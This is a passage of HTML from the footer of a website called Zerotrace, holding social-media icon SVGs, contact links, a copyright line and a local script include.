        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
      </svg>
    </a>
    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
      </svg>
    </a>
    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
      </svg>
    </a>
  </div>
  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
</footer>
<script src="../script.js"></script>
</body>
</html>
